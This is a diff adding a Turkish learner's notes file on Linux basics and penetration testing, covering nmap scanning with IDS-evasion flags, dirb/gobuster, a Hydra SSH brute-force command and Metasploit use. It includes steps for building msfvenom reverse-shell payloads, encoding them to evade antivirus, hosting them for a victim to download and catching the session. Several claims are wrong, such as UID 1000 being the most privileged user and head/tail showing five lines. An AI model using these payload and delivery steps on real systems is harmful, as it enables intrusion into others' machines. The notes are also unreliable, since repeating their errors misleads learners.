@@ -1,0 +1,3064 @@
+CREA
+Not : setxkbmap tr : Klavyeyi Türkçe Yapar
+
+1- (apt-get install/update/upgrade) tarzı komutlar ile güncelleme indirme gibi işleri yaparız
+
+2- (pwd) komutu bulunduğumuz dizini gösterir
+
+3- (ls) komutu dizinde bulunan dosyaları gösterir ls -a gizli dosyaları da gösterir
+
+4- (cd) komutu bulunduğumuz dizini değiştirir cd .. komutu ise bir önceki dizine geçmemizi sağlar	
+
+5- (cd ..) komutu tek dizin yukarı taşısa da en üst dizine tek seferde gitmek için cd / komutunu kullanabiliriz
+
+6- tek tek dizinlere girmek yerine tek seferde (cd /dizinismi1/dizinismi2) ile gidebiliriz
+
+7- (clear) komutu terminali temizlememizi sağlar
+
+8- (nano dosyaadı) komutu ile bulunduğumuz dizinde bu isimde bir dosya açabiliriz
+
+9-Eğer root yetkisine sahip değil isek terminalde (su) komutunu yazdıktan sonra şifremizi girerek
+  Root yetkisine giriş yapabiliriz ve yetki sorunu olmadan dilediğimizi yapabiliriz
+
+10- (touch) komutu da dosya oluşturmak için kullanılır
+    a: touch ile dosya oluşturduktan sonra tekrar nano komutu ile içine bir şeyler yazılabilir
+
+11-Bir dosyayı silmek için (rm dosyaadı) komutunu kullanırız
+
+12- (exit) komutunu root yetkisinden çıkmak için kullanılabilir
+
+13- (id) komutu kullanıcı hakkında bilgi verir
+
+14- (mkdir) komutu yeni dizin oluşturmak için kullanılır
+
+15- (rmdir) komutu dizin silmek için kullanılır
+
+16- Bir dosyayı kopyalamak için (cp dosyaadı /kopyalamakİstediğimizDizin) komutu ile kopyalayabiliriz
+
+  Not: Bir dosya değil de dizin kopyalamak istiyor isek dosya adından sonra -r komutu ile kopyalayabiliriz.(kopyası oluşur)
+
+17- Bir dosyayı taşımak için (mv dosyaadı /kopyalanacakYer) komutunu kullanırız.(kendisi taşınır)
+  
+  Not: Bu komut ile dizinleri taşımak için -r komutu gerekmiyor
+
+18-Dosya adı değiştirmek için (mv Eskiİsim Yeniİsim) komutunu kullanırız
+
+19-Bir dosyayı bulmak için locate komutunu kullanırız (locate /Varsa içinde aramak istediğimiz dizin/aramak istediğimiz dosyaadı)
+
+ Not: locate komutu büyük küçük harfe duyarlıdır bu durumu düzeltmek için (locate -i /etc/Shadow) 
+      benzeri bir komut verirsek büyük S harfini görmezden gelip arama yapacaktır.
+
+20-Bir dosyayı bulmak için diğer yol find komutudur kullanımı (find /dizinadı -name dosyaAdı) olarak çalıştırılır
+
+21- (cat dosyaAdı) komutu dosyanın içindekileri bize gösterirken 
+    ( cat dosyaAdı | grep "aranacak kelime") komutu dosyadan sadece aradığımız kelimeyi içeren satırları bize okutur
+
+21.5- wc komutu ile bir dosyanın satır sayısı kelime sayısı gibi bilgileri alabiliriz (git man wc bak)
+
+22- (head dosyaAdı) komutu bize o dosyanın ilk 5 satırını gösterir (head -n GörünecekSatırSayısı dosyaAdı ) komutu ile bu satırların sayısı arttırılabilir
+23- (tail dosyaAdı) komutu bize o dosyanın son 5 satırını gösterir (tail -n GörünecekSatırSayısı dosyaAdı ) komutu ile bu satırların sayısı arttılır
+
+  Not: head ve tail dosyalarında head komutunda görünen ilk satır dosyadaki ilk , tail komutunda görünen son satır ise dosyanın son satırıdır
+       tail komutunda görünen ilk satır en alt satır değildir 
+
+
+24- İşletim sistemi hakkında bilgiyi (uname) ve (uname -a) ile öğreniriz -a parametresi detayları arttırır
+    Çekirdek sürüm hakkında bilgi almak için ise (cat /etc/*-release) komutunu kullanırız
+
+  Not: İşletim sistemi hakkında bilgi almak için (cat /etc/issue) komutunu da kullanabiliriz 
+
+25- (man ParametmeAdı) komutu bir parametre hakkında bilgi verir ls,cat vs.
+
+26- Bir parametre hakkında daha bilgi almak için (parametreAdı --help) komutunu da kullanabiliriz
+
+27- history komutu daha önce kullanılan komutları gösterir
+
+28-İndirmeleri yapmak için (wget "indirilecekDosyaUrlsi") yapar isek indirmeyi yapacaktır
+
+29-Github'dan indirme yapmak için ise (git clone "url") komutunu  kullanabiliriz
+  
+  Not: Githubdan indirme yapmak için bu komut yerine wget kullanır isek sayfanın bütün kaynak kodlarını indirecektir
+       Tam tersi durumda diğer kaynak kodlarını da git clone ile indiremeyiz
+
+30-Kendi ıp adresimizi (ifconfig) komutu ile öğrenebiliriz ve her ıp adresinin sahip olduğu değiştirilebilir mac adreslerini de görürüz
+
+31-(arp -a) komutu ile ağ arayüzündeki diğer kullanıcıları da görebiliriz.
+
+32-Yeni kullanıcı oluşturmak için (useradd -m kullanıcıAdı) komutunu bu kullanıcıya şifre vermek için ise (passwd kullanıcıAdı) komutunu kullanırız.
+   O kullanıcıya giriş yapmak için ise (su kullanıcıAdı) komutunu veririz.(exit) komutu ile ise ana kullanıcıya döneriz.
+
+33-(id) komutu ise bize sistemdeki kullanıcıları yetki sırasına göre gösterir.En yetkili kullanıcı numarası 1000'dir.
+
+34-Sisteme giriş saati vb bilgileri almak için ise (w) komutunu ve (who -a) komutunu kullanabiliriz.
+
+35-(last -a) komutu bize son giriş yapılan günleri ve saatleri detaylıca gösterir.
+
+36-(ps -aux) komutu bize sistemde çalışan bütün process'leri bize gösterir. (ps -ef) komutu da bu görev için kullanılabilir.
+  
+  Not: Halihazırda görev yapan bir process'i sonlandırmak için kill komutu ile o process'in yanında bulunan PID numarasını yazarak process'i sonlandırabiliriz
+  örnek: kill 2724 (PID numaralarını ve process'leri görmek için ps -aux komutunu kullanmalıyız)
+
+37-(df -h) komutu ile sistemdeki disk kullanımı hakkında bilgi alabiliriz.
+
+38-(dirb "url") komutu sitedeki dizinleri tarar
+
+39- (unrar e dosyaAdı) komutu bize rar uzantılı dosyaları açmamızı sağlar
+
+40-Önemli diğer komutlar: 
+ls : Dizinde bulunan her şeyi listeler.
+ls -a : Gizli dosyalar ve dizinlerle beraber listeler.
+ls -l : Bütün dosyaları boyut ve tarihini göstererek listeler.
+tar -zxpf : Uzantısı tar.gz olan sıkıştırılmış dosyaları açar.
+tar -xpf  :Uzantısı .tar olan dosyaları açar.
+gunzip  :Uzantısı .gz olan dosyaları açar.
+cp : Dosyayı kopyalar.
+mv : Bir dosyayı başka bir dizine taşımanızı sağlar ya da dosya adını değiştirir.
+mkdir : Yeni bir dizin oluşturmanızı sağlar.
+rmdir : Belirtilen dizini silmenizi sağlar.
+rm  :Dosya silmenizi sağlar. ör: rm log.txt
+rm -rf  :Dizin silmenizi sağlar.
+cd : Belirtilen dizine geçmenizi sağlar. ör: cd klasor
+cd .. : Bir üst dizine geçmenizi sağlar.
+cd ~ : En üst dizine çıkmanızı sağlar.
+pwd : O anda bulunduğunuz dizini görüntüler.
+pico : Belirtilen dosyayı text editör ile düzenlemenizi sağlar.
+ftp : Belirtilen siteye FTP bağlantısı sağlar.
+lynx : Belirtilen siteyi görüntüler.
+df : Harddisk istatistiklerini gösterir.
+quota : Disk kullanımınızı gösterir.
+uname : İşletim sisteminin durumunu gösterir.
+whoami : Kendi bilgilerinizi gösterir.
+who : Sunucuya bağlı olanları gösterir.
+last : Hesabınıza yapılan en son bağlantıyı gösterir.
+whereis : Belirtilen dosyanın nerede olduğunu gösterir.
+BitchX :IRC programını çalıştırır.
+mail : Postalarınızı kontrol eder.
+ps -x : Sizin çalıştırdığınız işlemleri gösterir.
+ps -a : Sunucuda çalıştırılan tüm işlemleri gösterir.
+ps -ux:  Çalıştırılan işlemlerin CPU/RAM kullanımıyla gösterir.
+kill :Pid numarası verilen işlemi durdurur.
+kill -9 :Pid numarası verilen eggdrop işlemini durdurur.
+killall: Belirtilen program türündeki tüm işlemleri durdurur.
+whatis : Belirtilen komutun açıklamasını verir.
+man : Komut hakkında yardım görüntüler
+passwd : Shell hesabınıza girerken kullandığınız şifreyi değiştirmenizi sağlar. Kullanımı: passwd kullaniciadi
+vhosts ya da vhost:  Sistemde bulunan vhostları (virtual host) listeler.(BNC için kullanabilirsiniz)
+
+ip addr : Linux makinenin ip adresini öğrenme komutu
+
+ 
+
+Linux Makinede SSH ile Hesap açmak
+* ROOTTA HESAP AÇMAK : adduser login & chown mavigok /home/login & passwd pass1 , passwd pass2
+reboot Linux Sunucuya restart atmak için kullanılır.
+service mysql restart mysql restart atar
+service httpd restart apache ye rest atar
+ service httpd stop Sitelere ulaşımı kapatır
+apf -d ipadresi verilen ipe ban atar
+service apf restart apf ye restart atar
+netstat -n sunucuya baglanan ipleri gösterir
+netstat -a sunucuya bağlanan reseller ipleri gösterir(Proxy kullanmanız fark etmez her zaman gerçek çıkış ipi görünür)
+pico ssh üzerinden text editor ile dosya içeriğini görme ve düzenlemeye yarar.
+top Sistem cpu kullanımını gösterir.
+uptime Uptime Durumu
+
+                           MODELLER
+
+1-OSI modeli: 7 katmandan oluşan ve yazılımların programların aynı çatı altında birbiriyle uyumlu çalışabilmesi için kullanılan bir modeldir
+
+    Gönderici katmanları sırası ile uygulama>>sunum>>oturum>>ulaşım>>ağ>>veri bağı>>fiziksel olarak gider
+    Alıcı katmanları ise bunun tam tersi olarak devam eder ve iletişim sağlanır
+  
+  Uygulama-Application: HTTP,FTP,IRC,SSH,DNS
+
+  Sunum-Presentation: SSL,SSH,IMAP,FTP,MPEG,JPEG =Şifrelenen kodların diğer tarafa okunabilir bir şekilde çevrilmesini sağlar Encoding/Decoding.Encryption/Decryption
+                      Dosyanın formatı burada belirlenir.
+
+  Oturum-Session:API's,Sockets,Winsock =Gerektiğinde Doğru bilgisayar ile iletişim kurulmasını sağlar(bağlantı koordinasyonu)
+
+  Ulaşım-Transport:TCP,UDP =Verinin iletilip iletilmediğini zamanında ulaşıp ulaşmadığını kontrol eder.Veriyi tek seferde göndermeden segmentlere ayırır.
+
+  Ağ-Network:IP,ICMP,IPSec,IGMP =En kısa ve doğru yoldan gönderilmesini ,Veri paketlerinin hedefe yöneldnririlmesi ve iletilmesini sağlar.Bir üst katmanda segmentlere
+             ayrılan veriyi paketler ayrıca gönderileceği adres burada işleniyor
+
+  Veri Bağı-Data Link:Ethernet,PPP,Switch,Bridge =Fiziksel katmana ulaşmak ve kullanmak ile ilgili kuralları belirler.Bir çerçeve oluşturup gerekli bütün bilgileri 
+                      buraya kaydeder
+
+     Not: Mac alt katmanı veriyi hata kontrol kodu(CRC),alıcı ve gönderenin MAC adresleri ile beraber paketler ve fiziksel katmana aktarır
+          Alıcı tarafta da bu işlemleri tersine yapıp veriyi veri bağlantısı içindeki ikinci alt katman olan LLC'ye aktarmak görevi yine MAC alt katmanının görevidir
+ 
+     Not:LLC alt katmanı bir üst katman olan ağ katmanı için geçiş görevi görür.Protokole özel mantıksal portlar oluşturur(SAPs).
+         Böylece kaynak makinada ve hedef makinada aynı protokoller iletişime geçebilir.(Örneğin TCP/IP<<>>TCP/IP)
+         LLC ayrıca veri paketlerinden bozuk gidenlerin (veya karşı taraf için alınanların)tekrar gönderilmesinden sorumludur.
+         Flow Control yani alıcının işleyebileceğinden fazla veri paketi gönderilerek boğulmasının engellenmesi de LLC'nin görevidir.
+
+        
+  Fiziksel-Physical:Coax,Fiber,Wireless,Hub,Repeaters = ELektrik sinyalleri,ışık sinyalleri,radyo vb sinyallerden sorumludur.OSI modelindeki donanım katıdır.
+                    Veri burada 0 ve 1'lere hatta elektrik sinyallerine dönüştürülür.
+     
+      Not:Hub=Bu cihazlar gelen veriyi bir takım elektrik sinyali olark gören ve bu sinyalleri çoğaltıp,diğer portlara gönderen cihazlardır.
+
+2- Cyber Kill Chain: Bir siber saldırı yaşam döngüsüdür.Bize saldırgan(!) bakış açısı sağlamak görevi vardır.7 adımdan oluşur
+
+      Reconnaissance =Keşif,bilgi toplama aşamasıdır.Hedef hakkında bilgi toplanır
+      Weaponization =Silahlanma aşamasıdır.Nasıl erişim sağlayacağımızı nasıl sömüreceğini belirlediğimiz seviyedir.Bir zararlı yazılım oluşturulur
+      Delivery =İletim adımıdır.Zararlı yazılım hedefe iletilir
+      Exploitation=Sistemdeki açığı sömürme aşamasıdır
+      İnstallation =Gönderdiğimiz zararlı yazılımın bizi orada kalıcı yapması aşamasıdır.Bu aşamda yapılan yükleme ile sistemdeki komuta yetkisini alıyoruz
+      Command and Control = Sistemde yapmak istediğimiz çalmak istediğimiz veriyi sömürdüğümüz komuta kontol aşamasıdır.
+      Action on  Objectives = Komuta kontrol ele geçirildikten sonra sistemde gerçekleştirilen eylem.
+
+3-Genel saldırı metodolojisi
+    1-Bilgi Toplama
+    2-Ağ Haritalama
+    3-Zayıflık Tarama
+    4-Sisteme Sızma "Exploit Çalıştırmak"
+    5-Yetki Yükseltme
+    6-Başka Ağlara Sızma
+    7-Erişimleri Koruma
+    8-İzleri Temizleme
+    9-Raporlama 
+                                                BİLGİ TOPLAMA
+
+1-Pasif bilgi toplama bilgisayarla bir bağ kurmadan yapılan bilgi toplamadır
+  Aktif bilgi toplama ise bilgisayarla bağ kurarak toplanan bilgidir
+
+2-whois.com sitesi kullanışlı bir pasif bilgi toplama aracıdır.Bir sitenin sahibinin adresi telefonu maili gibi önemli bilgilere ulaşmamızı sağlar
+
+3-archive.org sitesi ise bize bir sitenin önceki hallerinin görüntüsünü değiştirilme zamanlarını vs gösteren pasif bilgi toplama aracıdır.
+
+4- theHarvester tool'u ile bir websitesinin çoğu saldırıda bize yardımcı olacak subdomainlerini ve bunun yanı sıra bazı önemli bilgileri alabiliriz.
+ 
+    Not: kullanım= theHarvester -d siteİsmi -l limit(aramaSayısı) -b kaynak(all diyerek hepsini alabilriiz)
+   
+5-dig tool'u ile alan isimlerini mail sunucularını sorgulama DNS Zone Transfer tespiti,DNS ve IP bilgileri toplama gibi şeyler yapabiliriz
+     
+    Not: kullanım= dig (mx/ns/a komutları isteğe bağlıdır) siteİsmi
+    NOt: dig tool'u ile dns zone transfer açıklığı bulmak için (dig axfr siteİsmi @IP/NS sonucu) komutunu kullanırız ve buradan bilgi ifşası sağlayabiliriz   
+
+6-dirb tool'u ile bir sitedeki dizinleri tarayıp oradan bize dönen cevapları görebiliriz
+  Eğer 403 kodu dönüyor ise o dizinlere erişim yetkimiz yok demektir
+  Eğer 301 kodu dönüyor ise o dizinlerde yönlendirme var demektir
+  Eğer 200'lü kodlar dönüyor ise onlarda işlem yapma ihtimalimiz yüksek
+  
+ Not: Kullanımı = dirb TamWebSitesi /kullanmak istediğimiz wordlistin konumu
+
+7-gobuster tool'u ile de bir sitedeki dizinleri tarayıp dönen cevapları görebiliriz
+  
+ Not:Kullanımı= gobuster dir (-u) tamSiteİsmi -w WordlistKonumu
+
+              dirb ve gobuster farkı
+      a-dirb bir kere taradıktan sonra dizinlerin içindeki dizinlere bakar ama gobuster bir kere tarayıp durur
+      b-gobuster dirb'den 20-30 kat daha hızlı çalışır
+
+ Not:Bulduğumuz açık dizinlerden admin paneline giriş sağlayabilirsek php reverseshell taktiği ile yetki yükseltme yapılabilir
+
+8-dmitry tool'u ile bir sitenin whois.com bilgileri subdomainleri mail adresleri ve açık portlar gibi çoğu bilgiye genel olarak ulaşabiliriz
+
+                                          WORDLİST OLUŞTURMA
+1-crunch tool'u ile wordlist oluşturma komutunu verebiliriz
+  
+  Not:Kullanımı = crunch minimumBasamak maksimumBasamak içindeBulunacakKarakterler -o dizindeOluşacakDosyaAdı
+  Not:Eğer bulacağımız şifrenin bazı basamaklarını biliyor isek mesela ???2?46 gibi bir şifre için wordlist oluşturacak isek yazılacak kod
+      = crunch 7 7 -t %%%2&46 1234567890 -o maxwell.txt
+     komutu bize 7 basamaklı bildiğimiz rakamların yerini değiştirmeden alınacak bütün ihtimallerin wordlistini oluşturur   
+
+2-cupp.py programı bizden kullanıcı ile ilgili bilgiler isteyerek o bilgiler üzerinden olabilecek muhtemel şifreleri çıkartır.
+      python3 cupp.py -i komutu ile çalışır.
+
+3- Zafiyetli makine kurmak için typhoon kullandık saldırıları buraya yapacağız şuan için.
+
+4-Nmap kullanımı sayesinde ağ haritalandırma konusunda önemli gelişmeler elde edebiliriz.
+ 
+  -sn : ağ arayüzünde iletişim kurulabilecek ıp adreslerini sunar
+
+   -sS (syn scan) : port taraması yapar
+
+   -sV (version scan) : versiyonaları da kullanıcıya gösterir. Her işlemde kullanılması kullanıcının aldığı bilgiye güvenilirlik katar
+
+   -f : Daha az dikkat çekmek için parça parça işlem yapar
+
+   -D : Hedefe farklı ıp adreslerinden istek gönderir.Kafa karıştırma için kullanılır kullanımı -DIP1,IP2,IP3... saldırılacakIP ile sağlanır
+
+   -O : Hedefin işletim sistemi hakkında detaylı bilgi gösterir
+
+   -A : Önceki açık portları versiyonları, işletim sistemini ve script açıkları hakkında bilgi verir.Kritik olabilecek bilgileri de kullanıcıya sunar
+
+   -sU: Nmap default olarak Tcp taraması yapar ama biz eğer Tcp dışında Udp taraması da yapmak istiyor isek -sU komutu ile Udp taramasını nmap'e yaptırabiliriz
+
+   -sT: Tcp portlarını aramak için kullanırız default durumda bu komut çalışır ama default değiştiği durumda Tcp portları taramak için bu komutu vermeliyiz.
+
+   -p : Taranacak portları belirtmek için kullanılır -p 22 der isek sadece 22 portunu tarar -p- olarak komut verirsek bütün portları tarar -p1-65535 komutu da bütün portları tarayacaktır
+       Default olarak en popüler 1000 portu tarar
+
+--open: Sadece açık portların listelenmesini sağlar nmap default durumda filtrelenmiş portları da gösterdiği için bazı durumlarda bunu kullanabiliriz.
+
+   -Pn: ICMp paketleri kabul etmeyen sistemlerde atılan ping güvenlik duvarında reddedilebilir bu yüzden bu komutla ping atmadan açık portlara baktırabiliriz
+ 
+  -vv: İşlem devam ederken bu yapılan işlemlerin bize gösterilmesini sağlar
+
+   -sF: sS gibi portları tarar ama tarama yöntemi farklıdır
+
+   -oN: Taranan verileri bir dosyaya kaydetmek için kullanılır bu komutu verdikten sonra dosya ismi yazarak çıktıları o dosyaya yazdırabiliriz.
+ 
+ Firewall/IDS atlatmak: Güvenlik duvarlarına yakalanmadan işlem yapmak için verilen komutları  içerir. Özünde bir bypass tekniğidir
+
+   -f: IP adresi veya web sitesi ile paketler üzerinden iletişim kurmaya çalışır.Bazı güvenlik duvarları kullanıcı ile saldırganı ayırt etmek için veri sınırı koyar
+       Bu parametre sayesinde paketlere böldüğümüz veriyi göndermek gizlilik açısından daha yararlı olur.
+
+--mtu: Transfer veri boyutunu elle yazmaya yardımcı olur -f komutunu default olarak kullanmak istemiyor isek bunu kullanmak bize yardımcı olacaktır.Kaç parçaya bölmek istediğimizi belirtiriz.
+
+--spoof-mac:Farklı mac adreslerinden istek atılmasını sağlar
+
+Timing ve Performance: Zaman ve performans ayarlama komutlarıdır.
+
+-T:Hız ayarlama komutudur,Güvenlik duvarı atlatmaya yardımcı olabilir.0-5 arası değer alır 0=Paranoid 1=Sneaky 2=Polite 3=Normal 4=Agressive 5=İnsane olarak tanımlanır en hızlı 5 en yavaş 0'dır.
+   4-5 Hızında kullanılması çok önerilmez  gereksiz ve hızlı trafik yaratır ve ilgileri çekebilir.
+
+--max-rate: Yanına bir sayı girilerek kullanılır.Saniyede iletilecek en fazla paket sayısını belirler
+--min-rate: Yanına bir sayı girilerek kullanılır.Saniyede iletilecek en az paket sayısını belirler
+
+Scriptler:Zaafiyet tespiti,Bruteforce saldırıları, kritik bilgileri ifşa etmek için kullanılır
+
+-sC:Nmap databese'inde bulunan bütün scriptleri kontrol eder
+
+--script scAdı:Belirli bir scripti taramamızı sağlar scriptleri ise /usr/share/nmap/scripts konumunda bulabiliriz
+               Eğer scriptin tam adını bilmiyor isek veya ilgili bölümdeki bütün scriptleri denemek istiyor isek (--script http*) komutunu verebiliriz.
+
+--script-help: Scriptler ile ilgili bilgi almak için kullanırız
+
+   Not: açık olan ssh portları üzerinden eğer kullanıcı ve şifre bilgisine sahip isek bağlantı kurabiliriz. http portları üzerinden ise gizli bilgilere ulaşmak mümkün
+
+   Not: PUT metodu ile http portlarında dosya ekleme yükleme veya değiştirme işlemleri yapılabilir
+
+
+5-searchploit tool'u ile bir uygulamanın versiyonunu vererek oradaki açıkları öğrenebiliriz ya da versiyon vermeyerek bütün açıkları görebiliriz
+
+
+                                               WEB ZAFİYET TESPİTLERİ
+
+1- Nikto tool'u zafiyet bulmak için kullanışlı olan bir araçtır.Kendi veritabanında bulunan zafiyetleri taradığı için bir noktada sınırlıdır.
+  
+   Not:Kullanım Örneği = nikto -h http://10.0.2.13/("url || ıp")
+
+2- Skipfish tool'u da web zafitet tespiti arayan bilgi ifşası yapan ayrıca birçok fotoğrafı dosyayı ve resmi listeleyen bir programdır.Kendi oluşturduğu dizinde bir html dosyası üzerinden bilgileri bize aktarır
+ 
+   Not:Kullanım Örneği = skipfish -o typhoon_skipfish(olmayanDizinAdı) "url || ıp"
+
+3-Searchsploit ile versiyon ya da uygulama üzerinden detaylı exploit bilgisi alınabilir. Bulduğumuz exploit'i indirmek ister isek searchsploit -m exploitDosyası komutunu kullanabiliriz.
+  Bulunduğumuz dizine dosyayı direkt olarak indirecektir
+	Kullanım : searchsploit anahtarkelime
+
+                                                METASPLOİT FRAMEWORK
+
+1-msfconsole komutu ile terminalde çalıştırılabilir.
+
+2- help komutu ile detaylı bilgi alınabilir
+
+3-search exploitİsmi komutu ile exploit auxiliary  ve post modüllerini göstereccektir.
+    
+   Not: kullanımları ise use sıraNo/DizinKonumu komutunu vererek çıktılarımızı buraya alabiliriz. show options komutu ile bununla ne yapılabileceğini görürüz.
+        Ayarlarını vermek için ise Örnek: set Rhosts 10.10.10.215 gibi bir komut ile karşıdaki insanın ıp'sini bilgisayara verebiliriz.
+        Gerekli modülleri verdikten sonra run komutunu çalıştırarak programı başlatabiliriz.
+        Bütün modülleri araştırmak ister isek show komutu ile bulmak istediğimiz modül adını verebiliriz	
+
+4-Örneğin saldıracağımız makinede gobuster veya dirb ile bir admin paneli bulduk ve bruteforce saldırısı yapmak istiyoruz
+  yapacağımız işlem panel url'sini aratmak olacak search phpmyadmin gibi.Buradan kendimize kullanılacak yöntemi seçmek için a: use komutu ile auxuiliary veya exploit adı vereceğiz
+  sonra ise b: show options ile gerekli olan IP Passlist  UsernameList port ve http adresi gibi gerekli bilgileri vererek
+  c:Set komutu ile gerekli bilgileri görür ve gireriz ayrıca unset all komutu ile de bilgileri sıfırlayabiliriz. d:exploit veya run komutu ile programı çalıştırırız.
+  e:back komutu ile modülü kullanmaktan vazgeçtik ise üst menüye dönebiliriz.
+  f:check komutunu her exploit desteklemese de gerekli ayarları yaptıktan sonra check komutu ile öntest yapabiliriz.
+  g: show info,info komutu ile bir modülün detaylı açıklamasını görebilirsiniz
+  h: jobs ve kill komutları ile arka planda çalışan modülleri listeleme kapatma işlemlerini yapabiliriz.
+  ı:bir modülde verdiğimiz ayarların diğerlerine de yansıması için setg komutu ile ayarları yapabiliriz.
+  i:save komutu ile uygulamadan çıkıp girdiğimizde önceki ayarlar ile devam edebiliriz
+  k: show advanced komutu ile ayarlar hakkında detaylı bilgileri alabiliriz.
+
+Not: kullanım 
+     1-gobuster veya dirb ile dizin taraması yapmak
+     2- nmap ile açık port ve script taraması yapmak
+     3- bulduğumuz açığı metasploit framework'de aratmak
+     4- use ile kullanılacak modülü seçmek
+     5- show options ve set .. ile gerekli bilgileri girmek
+     6-run veya exploit ile çalıştırmak
+
+5-Auxiliary çoğunlukla bilgi toplama işlemi için kullanılsa da bazen exploit gibi de kullanılabilir bir çok alt türü vardır. Scanner türü port tarama gibi işlemlerde
+ Admin türü genelde arka kapı yaratma veya bruteforce işleminde kullanılabilir bilgi toplama dışında exploit olarak kullanımını da burada görebiliriz.
+ 
+ Çoğu auxiliary türü ve kullanımı (Admin,Fuzzers,Dos,Server,Sniffer,Spoof, vb)
+ 1-Fuzzer:Bu modül sistemde fuzzer testi yapmamıza yarar kısaca sisteme sorular göndererek cevaplar alma ve çökme tepkilerini izlemeye yarar
+ 
+ 2-Scanner:Bu modül isimden de anlaşıldığı gibi sistemin açıklarını portlarını vb taramaya yarar.
+ 
+ 3-Admin: Admin modülleri sistemde servisleri taramaya onların hakkında bilgi sahibi olmamıza  ve yetki yükseltme işlemini bizim için görür
+
+ 4-Dos: Dos modülü sistemde bulunan firewall'a yoğun TCP paketi göndererek çökertir.Bu saldırıyı tek başına yapmak tamami ile saçmalıktır
+
+6-Exploitler :payloadlar ile beraber kullanılır yani sadece exploitler ile terminal erişimi vs almak çok da mümkün değil
+
+7-Exploit çalışma mantığı: örnek komutlarda önce bir zafiyet belirlendi sonra ise ona uygun exploit taraması yapıldı
+                           Gerekli exploit bulunduktan sonra ise girilmesi gereken bilgileri verdik ardından çalıştırdık
+                           Sonra ise çalışan exploit yarattığı açığa payload bağlandı ve bize terminal erişimini sağladı.
+                           Shell komutu ile de terminale komut vermeye başladık
+
+
+8- Terminale bağlandıktan sonra background komutu ile oturumu arka plana alabiliriz. sessions -i oturumNo ile de geri terminale bağlanabiliriz
+
+9-Post Modülleri:Bu modülleri bilgi toplama yetki yükseltme vb işlevlerde terminal erişimi sağladıktan sonra kullanırız.Kullanımı ise
+                 önce terminalimizi background'a alırız sonra show post diyerek listeler ve use ile onları kullanırız.
+                 Ayarları ise zor değildir tek yapmamız gereken açık olan session numarasını vermektir
+
+
+                                             MSFVENOM İLE ZARARLI YAZILIM OLUŞTURMA
+1-Bir zararlı yazılım için önemli olan onun bir işletim sisteminde güvenlik duvarına veya antivirüs progrlamlarına takılmamasıdır
+  Yazılımlarımızı oluştururken buna dikkat edeceğiz.
+
+2-msfvenom kullanım örneği = usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST<IP> -f exe  -o payload.exe
+
+3- Genellikle Android için .apk Linux için raw ve elf ,Windows için .exe uzantılarını kullanırız.
+
+4-Eğer bu yazılımı kendi ağımızdan birine gönderecek isek LHOST kısmına kendi IP adresimizi eğer uzaktan başka bir işletim sistemine saldıracak isek modemin IP adresini yazmalıyız
+ 
+5-Encode teknikleri antivirüs yazılımlarını atlatmak için kullanılır.
+
+6-Yaptığımız virüsleri denemek için virüstotal.com adresinden bilgi alabiliriz.(Yüklediğimiz virüsler diğer antivirüs şirketlerine bildirilir.
+
+7-Yazılımlarımızı karşıya açmak için ise python -m SimpleHTTPServer 4321 komutu ile 4321 portunda bir bağlantı noktası açabiliriz.
+  Karşı bilgisayarda ise wget http://(Ip):4321/ZararlıYazılımAdı                 AYNI LOCAL AĞ İÇİN GEÇERLİ
+
+8-Sonra msfconsole ile metasploit framework'u çalıştırıp use multi/handler'ı use komutu ile alıyoruz
+9-Sonrasında ise kullandığımız payload'ı set ile ekliyoruz LHOST ve LPORT bilgilerini vererek çalıştırmak oluyor işimiz.
+
+Mantık noktası: Yaptığımız zararlı yazılımı karşıya gönderdikten sonra msfconsolda verdiğimiz bilgiler ile o portu dinlemeye alıyoruz
+                Eğer kişi o dosyayı açar ise de direkt olarak msfconsole üzerinden session açıp yetki sahibi oluyoruz
+Komutlar:
+ 
+  -p: payload olduğunu belirtmek için kullanırız sonrasında kullanmak istediğimiz payload'ı seçeriz
+  
+  -l,--list: listelemek için kullanılır
+  
+  -f:Format belirtmek için kullanılır exe,apk,elf vs
+  
+  -o:İsimlendirme için kullanılır
+
+  -i:Virüsün kaç kere encode edileceğini belirmek için kullanırız.
+
+  -e:Encode tekniği seçmek için kullanılır encode listesini msfvenom --list encoders diyerek görebiliriz.Encode etme sayısının artması ve encode tekniğinin kalitesi
+     Zararlı yazılımın kalitesi için önemlidir
+
+                                              ENCODE TANIMA YÖNTEMLERİ
+1-Base64 encode yapılışında genelde kod çift haneye tamamlanmak için sonuna eşittir konulur.Yani bir base64 kodu çift sayılı haneden oluşmak zorundadır
+
+2-Eğer bir hash sadece rakamlardan oluşuyor ve sürekli tekrar eden rakamlardan oluşuyor ise ascıı kodu olabilir
+
+3-NTLM Windows dağıtımlarında güvenliği sağlayan bir şifreleme türüdür
+
+
+   Not:Linux dağıtımlarında bulunan hash identifier tool'u ile bir kodun hangi encode yöntemi ile şifrelendiğini bulabiliriz
+
+1-Airodump-ng aracı ile çevremizdeki paketi yayan bütün ağ cihazlarını görüntülemek için kullandığımız bir araçtır.
+  Örnek: airodump-ng -r bilal.pcap --uptime
+
+2-Wireshark tool'u ile yapılan işlemleri izleyebilir bilgi toplayabilir ve detaylarına göz atabiliriz
+  Videoda wireshark'ın .pcapng uzantılı bir dosyayı açtığını gördüm önemli olabilir.
+
+
+Not: enum4linux ile detaylı bilgi toplama işlemi yapılabilir
+  Kullanım Örneği: /usr/share/enum4linux/enum4linux.pl -a 10.10.100.180 | tee enum4linux
+
+
+Not: Hydra ile şifre veya username bruteforce attack yapılabilir.
+     Kullanım: hydra -l username -P genellikle rockyou.txt konumu, girilenport ,ıd
+         Örnek: hydra -l jan -P /usr/share/wordlists/rockyou.txt.gz ssh://10.10.100.180
+
+Root olmayan kullanıcıların yapamadıkları şeyler
+
+1- apt komutlarını kullanamaz
+2- nano ile açılan dosyaları kaydedemez
+3- bin dizininde yeni bir dizin veya dosya oluşturamaz
+4- root dizinine erişimi yoktur
+5- bir kullanıcı kendi dizininde iken yetki hatası ile karşılaşmaz
+
+
+
+
+------------------------- 1 Ekim 2021---------------------------
+
+1-VirtaulBox Anlık görüntüler ile makine yedeklemesi yapılabilir
+
+2- apt-get clean : Güncellemeleri temizler
+
+	Not: apt-get update sistemi -- apt-get upgrade uygulamaları günceller
+
+
+3- Batral Koç Notları
+
+	pwd = neyin içinde olduğunu gösterir
+	ls = içinde ne var
+	cd = ilgili klasöre gider
+	cd .. = geri gider
+	mkdir = klasör oluşturur
+	clear = ekranı temizler
+	apt-get update = sistemi günceller
+	apt-get upgrade = sistemdeki bütün programları günceller
+	ctrl + c = işlemi sonlandırır
+
+4- Bir siteyi pingleyerek IP'sini bulabilirsin
+
+5- 192.168.1.1 : Modem IP'sidir
+
